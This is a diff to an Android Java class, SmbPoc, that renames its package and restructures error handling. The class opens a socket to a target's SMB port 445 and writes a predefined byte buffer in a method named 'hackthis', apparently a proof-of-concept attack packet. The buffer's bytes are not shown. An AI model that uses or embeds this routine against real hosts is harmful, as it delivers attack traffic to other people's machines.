@@ -1,9 +1,12 @@
-package info.lamatricexiste.smbpoc;
+package info.lamatricexiste.network;
 
+import java.io.IOException;
 import java.io.OutputStream;
 import java.net.InetAddress;
 import java.net.InetSocketAddress;
 import java.net.Socket;
+
+import android.util.Log;
 
 public class SmbPoc implements Runnable
 {
@@ -23,39 +26,35 @@ public class SmbPoc implements Runnable
     private final int           TIMEOUT  =  250;
     private final int           PORT     =  445;
     private InetAddress         host     =  null;
-    private String              message  =  null;
+//    private String              message  =  null;
 
     public void run()
     {
-        try {
-            hackthis(host);
-            setMessage(host.getHostAddress() + " sent buffer");
-        }
-        catch (InterruptedException e) {
-            setMessage(e.getMessage());
-        }
-        catch (Exception e) {
-            setMessage(e.getMessage());
-        }
+        hackthis(host);
+//        setMessage(host.getHostAddress() + " sent buffer");
     }
     
-    public void setMessage(String msg){
-        this.message = msg;
-    }
+//    public void setMessage(String msg){
+//        this.message = msg;
+//    }
     
     public void setHost(InetAddress h){
         this.host = h;
     }
 
-    private void hackthis(InetAddress ipHost) throws Exception {
+    private void hackthis(InetAddress ipHost) {
         Socket s = new Socket();
-        s.bind(null);
-        s.connect(new InetSocketAddress(ipHost, PORT), TIMEOUT);
-        OutputStream out = s.getOutputStream();
-        for(int b: buff){
-            out.write(b);
+        try {
+            s.bind(null);
+            s.connect(new InetSocketAddress(ipHost, PORT), TIMEOUT);
+            OutputStream out = s.getOutputStream();
+            for(int b: buff){
+                out.write(b);
+            }
+            out.close();
+            s.close();
+        } catch (IOException e) {
+            Log.e("SMBPOC", e.getMessage());
         }
-        out.close();
-        s.close();
     }
 }
